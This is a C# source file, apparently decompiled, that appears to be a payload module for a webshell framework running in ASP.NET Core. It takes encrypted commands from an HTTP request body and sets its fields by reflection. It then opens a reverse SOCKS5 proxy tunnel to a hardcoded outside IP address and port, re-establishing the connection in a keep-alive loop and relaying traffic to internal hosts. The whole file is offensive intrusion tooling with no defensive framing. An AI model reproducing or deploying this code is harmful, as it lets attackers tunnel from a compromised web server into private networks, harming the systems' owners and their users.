using System.Net;
using System.Net.Sockets;
using Microsoft.AspNetCore.Http;
using System.Reflection;
using System.Text;
using System.Security.Cryptography;

public class U
{
    public HttpRequest Request;
    public HttpResponse Response;
    public ISession Session;


    public string content;

    public string sessionId;


    private DefaultHttpContext context;

    private object current;


    public Dictionary<string, Object> globals = new Dictionary<string, Object>();

    public string error_msg;


    public static string action;


    public static string remoteIP;


    public static string remotePort;


    private Dictionary<string, Socket> outerSocketMap = new Dictionary<string, Socket>();


    private Dictionary<string, Socket> targetSocketMap = new Dictionary<string, Socket>();


    private int unused = 0;

    public override bool Equals(object obj)
    {
        this.init(obj);
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        try
        {
            if (U.action.Equals("create"))
            {
                Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                dictionary2.Add("remoteIP", U.remoteIP);
                dictionary2.Add("remotePort", U.remotePort);
                this.sessionSet("remoteSocks_running", "true");
                new Thread(new ParameterizedThreadStart(this.link)).Start(dictionary2);
                Thread.Sleep(1000);
                new Thread(new ThreadStart(this.transData)).Start();
                new Thread(new ThreadStart(this.keepAlive)).Start();
            }
            else if (U.action.Equals("stop"))
            {
                this.sessionSet("remoteSocks_running", "false");
                this.stopSocks();
            }

            dictionary.Add("status", "success");
        }
        catch (Exception ex)
        {
            dictionary.Add("status", "fail");
            dictionary.Add("msg", ex.Message);
        }

        this.Response.WriteAsync(Encoding.UTF8.GetString(this.EnjsonAndCrypt(dictionary)));
        return false;
    }


    private void global()
    {
        Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();


        string targetAssemblyFullName = "Echo, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null";
        var targetAssembly =
            assemblies.FirstOrDefault(assembly => assembly.GetName().FullName.Equals(targetAssemblyFullName));

        if (targetAssembly != null)
        {
            string targetTypeName = "U";
            Type targetType = targetAssembly.GetType(targetTypeName);

            if (targetType != null)
            {
                object instance = Activator.CreateInstance(targetType);
                FieldInfo instancesField =
                    instance.GetType().GetField("globals", BindingFlags.Static | BindingFlags.Public);
                globals = instancesField.GetValue(null) as Dictionary<string, object>;
            }
        }
    }


    private void sessionSet(string key, object value)
    {
        string sessionKey = this.Session?.Id ?? this.sessionId;


        Dictionary<string, object> dictionary = (Dictionary<string, object>)this.globals[sessionKey];


        if (dictionary.ContainsKey(key))
        {
            dictionary[key] = value;
        }
        else
        {
            dictionary.Add(key, value);
        }
    }


    private object sessionGet(string key)
    {
        object obj;
        if (this.Session == null)
        {
            Dictionary<string, object> dictionary = (Dictionary<string, object>)this.globals[this.sessionId];
            obj = dictionary[key];
        }
        else
        {
            Dictionary<string, object> dictionary = (Dictionary<string, object>)this.globals[this.Session.Id];
            obj = dictionary[key];
        }

        return obj;
    }


    private List<string> sessionKeys()
    {
        List<string> list = new List<string>();
        if (this.Session == null)
        {
            Dictionary<string, object> dictionary = (Dictionary<string, object>)this.globals[this.sessionId];
            list.AddRange(dictionary.Keys);
        }
        else
        {
            Dictionary<string, object> dictionary = (Dictionary<string, object>)this.globals[this.Session.Id];
            list.AddRange(dictionary.Keys);
        }

        return list;
    }


    private void sessionRemove(string key)
    {
        if (this.Session == null)
        {
            Dictionary<string, object> dictionary = (Dictionary<string, object>)this.globals[this.sessionId];
            dictionary.Remove(key);
        }
        else
        {
            Dictionary<string, object> dictionary = (Dictionary<string, object>)this.globals[this.Session.Id];
            dictionary.Remove(key);
        }
    }

    private void stopSocks()
    {
        List<string> list = new List<string>();
        for (int i = 0; i < this.sessionKeys().Count; i++)
        {
            string text = this.sessionKeys()[i];
            if (text.StartsWith("socks_"))
            {
                list.Add(text);
                Socket socket = (Socket)this.sessionGet(text);
                try
                {
                    socket.Close();
                }
                catch (Exception)
                {
                }
            }
        }

        foreach (string text2 in list)
        {
            this.sessionRemove(text2);
        }
    }


    private void keepAlive()
    {
        while (this.sessionGet("remoteSocks_running").ToString().Equals("true"))
        {
            if (this.unused <= 10)
            {
                this.logs("create link\n" + this.unused);
                this.link(new Dictionary<string, object>
                {
                    { "remoteIP", "124.70.138.134" },
                    { "remotePort", "2222" }
                });
            }
            else
            {
                Thread.Sleep(500);
            }
        }
    }


    private void removeSession(string key)
    {
        try
        {
            Socket socket = this.targetSocketMap[key];
            Socket socket2 = this.outerSocketMap[key];
            lock (this.targetSocketMap)
            {
                this.targetSocketMap.Remove(key);
            }

            lock (this.outerSocketMap)
            {
                this.outerSocketMap.Remove(key);
            }

            socket.Close();
            socket2.Close();
        }
        catch (Exception ex)
        {
            this.logs("remove session error:" + ex.StackTrace);
        }
    }


    private void removeOuter(string key)
    {
        try
        {
            Socket socket = this.outerSocketMap[key];
            lock (this.outerSocketMap)
            {
                this.outerSocketMap.Remove(key);
            }

            socket.Close();
        }
        catch (Exception ex)
        {
            this.logs("removeOuter error:" + ex.StackTrace);
        }
    }


    private void removeTarget(string key)
    {
        try
        {
            Socket socket = this.targetSocketMap[key];
            lock (this.targetSocketMap)
            {
                this.targetSocketMap.Remove(key);
            }

            socket.Close();
        }
        catch (Exception ex)
        {
            this.logs("removeOuter error:" + ex.StackTrace);
        }
    }


    private void logs(string msg)
    {
    }


    private void transData()
    {
        byte[] array = new byte[102400];
        List<Socket> list = new List<Socket>();
        while (this.sessionGet("remoteSocks_running").ToString().Equals("true"))
        {
            List<Socket> listByDict = this.getListByDict(this.outerSocketMap);
            List<Socket> listByDict2 = this.getListByDict(this.targetSocketMap);
            list.Clear();
            list.AddRange(listByDict);
            list.AddRange(listByDict2);
            if (list != null && list.Count != 0)
            {
                try
                {
                    Socket.Select(list, null, null, 0);
                }
                catch (Exception ex)
                {
                    this.logs(ex.Message + "\n");
                }

                int i = 0;
                while (i < list.Count)
                {
                    Socket socket = list[i];
                    if (listByDict.Contains(socket))
                    {
                        string text = this.getKeyByValue(this.outerSocketMap, socket);
                        if (this.targetSocketMap.ContainsKey(text))
                        {
                            Socket socket2 = this.targetSocketMap[text];
                            try
                            {
                                int num = socket.Receive(array);
                                if (num > 0)
                                {
                                    socket2.Send(array, 0, num, SocketFlags.None);
                                }
                                else
                                {
                                    this.logs("read444444444:");
                                    this.removeOuter(text);
                                    if (!this.targetSocketMap.ContainsKey(text))
                                    {
                                        this.logs("rea66666666:");
                                        this.unused--;
                                    }
                                    else
                                    {
                                        this.logs("read5555555:");
                                        this.removeTarget(text);
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                this.logs("read1 exp:" + ex.Message);
                                this.targetSocketMap.Remove(text);
                                this.outerSocketMap.Remove(text);
                                this.unused--;
                            }
                        }
                    }
                    else if (listByDict2.Contains(socket))
                    {
                        string text = this.getKeyByValue(this.targetSocketMap, socket);
                        if (this.outerSocketMap.ContainsKey(text))
                        {
                            Socket socket3 = this.outerSocketMap[text];
                            try
                            {
                                int num = socket.Receive(array);
                                if (num > 0)
                                {
                                    socket3.Send(array, 0, num, SocketFlags.None);
                                }
                                else
                                {
                                    this.removeSession(text);
                                }
                            }
                            catch (Exception ex)
                            {
                                this.removeSession(text);
                            }
                        }
                    }

                    IL_026C:
                    i++;
                    continue;
                    goto IL_026C;
                }
            }
        }
    }


    private string getKeyByValue(Dictionary<string, Socket> dict, Socket value)
    {
        string text = "";
        lock (dict)
        {
            foreach (KeyValuePair<string, Socket> keyValuePair in dict)
            {
                if (keyValuePair.Value == value)
                {
                    text = keyValuePair.Key.ToString();
                    break;
                }
            }
        }

        return text;
    }


    private List<Socket> getListByDict(Dictionary<string, Socket> dict)
    {
        List<Socket> list = new List<Socket>();
        lock (dict)
        {
            foreach (KeyValuePair<string, Socket> keyValuePair in dict)
            {
                list.Add(keyValuePair.Value);
            }
        }

        return list;
    }


    private void createSession(object paramsMapObj)
    {
        Dictionary<string, object> dictionary = (Dictionary<string, object>)paramsMapObj;
        string text = dictionary["outerSocketHash"].ToString();
        Socket socket = this.outerSocketMap[text];
        try
        {
            if (!this.handleSocks(socket, dictionary))
            {
                lock (this.outerSocketMap)
                {
                    this.outerSocketMap.Remove(text);
                }
            }

            lock (this)
            {
                this.unused--;
            }
        }
        catch (Exception ex)
        {
            if (this.outerSocketMap.ContainsKey(text))
            {
                lock (this.outerSocketMap)
                {
                    this.outerSocketMap.Remove(text);
                }
            }

            this.logs("create session err:" + ex.Message + ex.StackTrace);
        }
    }


    private void link(object paramsMapObj)
    {
        Dictionary<string, object> dictionary = (Dictionary<string, object>)paramsMapObj;
        try
        {
            string text = dictionary["remoteIP"].ToString();
            int num = int.Parse(dictionary["remotePort"].ToString());
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket.Connect(new IPEndPoint(IPAddress.Parse(text), num));
            lock (this)
            {
                this.unused++;
            }

            string text2 = string.Concat(new object[]
            {
                "socks_outer_",
                ((IPEndPoint)socket.LocalEndPoint).Port,
                "_",
                text,
                "_",
                num
            });
            lock (this.outerSocketMap)
            {
                this.outerSocketMap.Add(text2, socket);
            }

            dictionary["outerSocketHash"] = text2;
            new Thread(new ParameterizedThreadStart(this.createSession)).Start(dictionary);
        }
        catch (Exception ex)
        {
            this.logs("Link " + ex.Message);
        }
    }


    private bool handleSocks(Socket socket, Dictionary<string, object> paramMap)
    {
        byte[] array = new byte[1];
        int num;
        try
        {
            num = socket.Receive(array);
        }
        catch (Exception ex)
        {
            return false;
        }

        if (num > 0)
        {
            switch (array[0])
            {
                case 4:
                    return this.parseSocks4(socket);
                case 5:
                    return this.parseSocks5(socket, paramMap);
            }
        }

        return false;
    }


    private bool parseSocks5(Socket socket, Dictionary<string, object> paramMap)
    {
        NetworkStream networkStream = new NetworkStream(socket);
        int num = networkStream.ReadByte();
        for (int i = 0; i < num; i++)
        {
            int num2 = networkStream.ReadByte();
        }

        Stream stream = networkStream;
        byte[] array = new byte[2];
        array[0] = 5;
        stream.Write(array, 0, 2);
        int num3 = networkStream.ReadByte();
        int num4;
        int num6;
        if (num3 == 2)
        {
            num3 = networkStream.ReadByte();
            num4 = networkStream.ReadByte();
            int num5 = networkStream.ReadByte();
            num6 = networkStream.ReadByte();
        }
        else
        {
            num4 = networkStream.ReadByte();
            int num5 = networkStream.ReadByte();
            num6 = networkStream.ReadByte();
        }

        byte[] array2 = new byte[2];
        string text = "";
        switch (num6)
        {
            case 1:
            {
                byte[] array3 = new byte[4];
                networkStream.Read(array3, 0, 4);
                networkStream.Read(array2, 0, 2);
                string[] array4 = new string[4];
                for (int i = 0; i < array3.Length; i++)
                {
                    int num7 = (int)(array3[i] & byte.MaxValue);
                    array4[i] = num7 + "";
                }

                string[] array5 = array4;
                foreach (string text2 in array5)
                {
                    text = text + text2 + ".";
                }

                text = text.Substring(0, text.Length - 1);
                goto IL_01EF;
            }
            case 3:
            {
                int num8 = networkStream.ReadByte();
                byte[] array3 = new byte[num8];
                networkStream.Read(array3, 0, num8);
                networkStream.Read(array2, 0, 2);
                text = Encoding.UTF8.GetString(array3);
                goto IL_01EF;
            }
            case 4:
            {
                byte[] array3 = new byte[16];
                networkStream.Read(array3, 0, 16);
                networkStream.Read(array2, 0, 2);
                text = Encoding.UTF8.GetString(array3);
                goto IL_01EF;
            }
        }

        this.logs("parse error");
        IL_01EF:
        int num9 = (int)(array2[0] & byte.MaxValue) * 256 + (int)(array2[1] & byte.MaxValue);
        if (num4 == 2 || num4 == 3)
        {
            throw new Exception("not implemented");
        }

        if (num4 == 1)
        {
            text = Dns.GetHostAddresses(text)[0].ToString();
            try
            {
                Socket socket2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket2.Connect(new IPEndPoint(IPAddress.Parse(text), num9));
                string text3 = paramMap["outerSocketHash"].ToString();
                lock (this.targetSocketMap)
                {
                    this.targetSocketMap.Add(text3, socket2);
                }

                string text4 = (string)(paramMap["targetSocketHash"] = string.Concat(new object[]
                {
                    "socks_target_",
                    ((IPEndPoint)socket2.LocalEndPoint).Port.ToString(),
                    "_",
                    text,
                    "_",
                    num9
                }));
                byte[] array7 = U.mergeByteArray(new byte[][]
                {
                    new byte[] { 5, 0, 0, 1 },
                    Dns.GetHostAddresses(text)[0].GetAddressBytes(),
                    array2
                });
                networkStream.Write(array7, 0, array7.Length);
                return true;
            }
            catch (Exception ex)
            {
                byte[] array7 = U.mergeByteArray(new byte[][]
                {
                    new byte[] { 5, 5, 0, 1 },
                    Dns.GetHostAddresses(text)[0].GetAddressBytes(),
                    array2
                });
                networkStream.Write(array7, 0, array7.Length);
                this.logs(ex.Message);
                return false;
            }
        }

        return false;
    }


    public static byte[] mergeByteArray(params byte[][] arrays)
    {
        int num = 0;
        foreach (byte[] array in arrays)
        {
            num += array.Length;
        }

        byte[] array2 = new byte[num];
        int num2 = 0;
        foreach (byte[] array3 in arrays)
        {
            Buffer.BlockCopy(array3, 0, array2, num2, array3.Length);
            num2 += array3.Length;
        }

        return array2;
    }


    private bool parseSocks4(Socket socket)
    {
        return false;
    }

    private byte[] EnjsonAndCrypt(Dictionary<string, string> result)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(this.Dict2Json(result));
        return this.Encrypt(bytes);
    }

    private string Dict2Json(Dictionary<string, string> dict)
    {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append("{");
        foreach (string text in dict.Keys)
        {
            stringBuilder.Append("\"" + text + "\":\"");
            stringBuilder.Append(Convert.ToBase64String(Encoding.UTF8.GetBytes(dict[text])) + "\",");
        }

        if (stringBuilder.ToString().EndsWith(","))
        {
            stringBuilder.Remove(stringBuilder.Length - 1, 1);
        }

        stringBuilder.Append("},");
        stringBuilder.Remove(stringBuilder.Length - 1, 1);
        return stringBuilder.ToString();
    }

    public void global_init()
    {
        if (globals == null)
        {
            globals = new Dictionary<string, object>();
        }
    }

    private void init(object obj)
    {
        /*
         * .net core中重构体系，所以HttpContext.Current不存在类似的
         */
        global();
        this.global_init();
        this.current = obj;
        this.fillRequestHandler(obj);
        this.fillSessionHandler();
        this.fillParams();
    }


    private void fillRequestHandler(object obj)
    {
        this.context = (DefaultHttpContext)obj;
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8";
    }

    private void fillSessionHandler()
    {
        try
        {
            this.Session = ((HttpContext)this.context).Session;

            this.Session.Set("test", Encoding.UTF8.GetBytes("test"));

            if (!globals.ContainsKey(this.Session.Id))
            {
                if (globals != null)
                {
                    globals[this.Session.Id] = new Dictionary<string, object>();
                }
            }
        }
        catch (Exception ex)
        {
            if (this.sessionId != null)
            {
                if (!globals.ContainsKey(this.sessionId))
                {
                    if (globals != null)
                    {
                        globals[this.sessionId] = new Dictionary<string, object>();
                    }
                }
            }
            else
            {
                error_msg = ex.Message;
            }
        }
    }

    private void fillParams()
    {
        using (var memoryStream = new MemoryStream())
        {
            context.Request.Body.Seek(0, SeekOrigin.Begin);
            context.Request.Body.CopyTo(memoryStream);


            memoryStream.Seek(0, SeekOrigin.Begin);


            byte[] array = memoryStream.ToArray();


            array = Decrypt(array);


            Dictionary<string, string> extraData = getExtraData(array);


            if (extraData != null)
            {
                foreach (var key in extraData.Keys)
                {
                    var field = this.GetType().GetField(key);
                    if (field != null)
                    {
                        field.SetValue(this, extraData[key]);
                    }
                }
            }
        }
    }

    private byte[] Encrypt(byte[] data)
    {
        var EncryptFunc = ((DefaultHttpContext)current).Items["EncryptFunc"];
        MethodInfo method = (MethodInfo)EncryptFunc.GetType().GetProperty("Method").GetValue(EncryptFunc);


        byte[] array;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            array = new RijndaelManaged().CreateEncryptor(bytes, bytes).TransformFinalBlock(data, 0, data.Length);
        }
        else
        {
            array = (byte[])method.Invoke(null, new object[] { data });
        }

        return array;
    }

    private byte[] Decrypt(byte[] data)
    {
        var DecryptFunc = ((DefaultHttpContext)current).Items["DecryptFunc"];
        MethodInfo method = (MethodInfo)DecryptFunc.GetType().GetProperty("Method").GetValue(DecryptFunc);

        byte[] result;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = bytes;
                aesAlg.IV = bytes;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                result = decryptor.TransformFinalBlock(data, 0, data.Length);
            }
        }
        else
        {
            result = (byte[])method.Invoke(null, new object[] { data });
        }

        return result;
    }

    private Dictionary<string, string> getExtraData(byte[] fullData)
    {
        this.context.Request.Body.Seek(0, SeekOrigin.Begin);
        int num = this.IndexOf(fullData, new byte[]
        {
            126,
            126,
            126,
            126,
            126,
            126
        });
        byte[] bytes = new List<byte>(fullData).GetRange(num + 6, fullData.Length - num - 6).ToArray();
        string @string = Encoding.Default.GetString(bytes);
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        string[] array = @string.Split(new char[]
        {
            ','
        });
        foreach (string text in array)
        {
            string[] array3 = text.Split(new char[]
            {
                ':'
            });
            if (array3.Length == 2)
            {
                string key = array3[0];
                string string2 = Encoding.UTF8.GetString(Convert.FromBase64String(array3[1]));
                dictionary.Add(key, string2);
            }
        }

        return dictionary;
    }


    internal int IndexOf(byte[] srcBytes, byte[] searchBytes)
    {
        int num = 0;
        int result;
        if (srcBytes == null)
        {
            result = -1;
        }
        else if (searchBytes == null)
        {
            result = -1;
        }
        else if (srcBytes.Length == 0)
        {
            result = -1;
        }
        else if (searchBytes.Length == 0)
        {
            result = -1;
        }
        else if (srcBytes.Length < searchBytes.Length)
        {
            result = -1;
        }
        else
        {
            for (int i = 0; i < srcBytes.Length - searchBytes.Length; i++)
            {
                if (srcBytes[i] == searchBytes[0])
                {
                    if (searchBytes.Length == 1)
                    {
                        return i;
                    }

                    bool flag = true;
                    for (int j = 1; j < searchBytes.Length; j++)
                    {
                        if (srcBytes[i + j] != searchBytes[j])
                        {
                            flag = false;
                            break;
                        }
                    }

                    if (flag)
                    {
                        num++;
                        if (num == 2)
                        {
                            return i;
                        }
                    }
                }
            }

            result = -1;
        }

        return result;
    }

    private void fillRequest(object obj)
    {
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8";
    }

    private void fillSession()
    {
        try
        {
            this.Session = this.context.Session;
        }
        catch (Exception)
        {
            if (!context.Items.ContainsKey(this.context.Session.Id) ||
                this.context.Items[this.context.Session.Id] == null)
            {
                this.context.Items[this.context.Session.Id] = new Dictionary<string, object>();
            }
        }
    }
}